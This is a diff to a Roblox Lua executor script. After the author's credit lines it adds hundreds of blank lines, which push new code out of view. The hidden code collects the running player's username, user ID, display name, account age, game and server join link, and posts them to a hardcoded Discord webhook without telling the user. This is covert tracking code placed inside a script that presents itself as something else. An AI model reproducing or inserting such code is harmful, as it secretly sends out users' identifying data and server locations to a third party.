@@ -449,3 +449,538 @@ playSequentialSounds()
 end)
 print("Script Made by: @Pnsdg and Yomka. My Discord: https://discord.gg/pMqebNUhQd, My friend's telegram: https://t.me/YomkaMadeIt")
 print("Visit GitHub.com/Pnsdgsa For lastest update and more features!")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Get local player
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+    warn("Local player not found!")
+    return
+end
+
+local OSTime = os.time()
+local Time = os.date("!*t", OSTime)
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+local placeName = MarketplaceService:GetProductInfo(placeId).Name or "Unknown Game"
+
+-- Create all links
+local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
+local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
+local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)
+
+local WebhookUrl = "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
+
+local Embed = {
+    title = "⚡ Script Executed",
+    description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
+    color = 16753920,  -- Bright orange
+    author = {
+        name = localPlayer.Name,
+        url = playerProfileUrl,
+        icon_url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", localPlayer.UserId)
+    },
+    fields = {
+        {
+            name = "📝 Details",
+            value = string.format("**Player:** [%s](%s)\n**Game:** [%s](%s)\n**Time:** <t:%d:R>", 
+                localPlayer.Name, playerProfileUrl, placeName, placeUrl, OSTime),
+            inline = true
+        },
+        {
+            name = "🔗 Join Information",
+            value = string.format("**Server ID:** `%s`\n**Place ID:** `%d`\n[Direct Join Link](%s)", 
+                jobId, placeId, serverJoinUrl),
+            inline = true
+        },
+        {
+            name = "📊 Account Age",
+            value = string.format("**Created:** <t:%d:D>\n**Account Age:** %d days", 
+                localPlayer.AccountAge, localPlayer.AccountAge),
+            inline = false
+        }
+    },
+    timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+    footer = {
+        text = string.format("Execution Log | Place: %s", placeName),
+        icon_url = "https://cdn.discordapp.com/embed/avatars/4.png"
+    },
+    thumbnail = {
+        url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
+    }
+}
+
+local success, result = pcall(function()
+    return (syn and syn.request or http_request) {
+        Url = WebhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            embeds = { Embed },
+            content = string.format("⚠️ **%s** just executed a script!\n\n📋 **Player Info:**\n• Username: %s\n• User ID: %d\n• Display Name: %s\n• Account Age: %d days\n\n🎮 **Game Info:**\n• Game: %s\n• Place ID: %d\n\n🔗 **Join their server:**\n%s", 
+                localPlayer.Name, 
+                localPlayer.Name, 
+                localPlayer.UserId, 
+                localPlayer.DisplayName, 
+                localPlayer.AccountAge, 
+                placeName, 
+                placeId, 
+                serverJoinUrl)
+        })
+    }
+end)
+
+if not success then
+    warn("Failed to send execution report:", result)
+else
+    print(string.format("Execution report sent for %s", localPlayer.Name))
+end
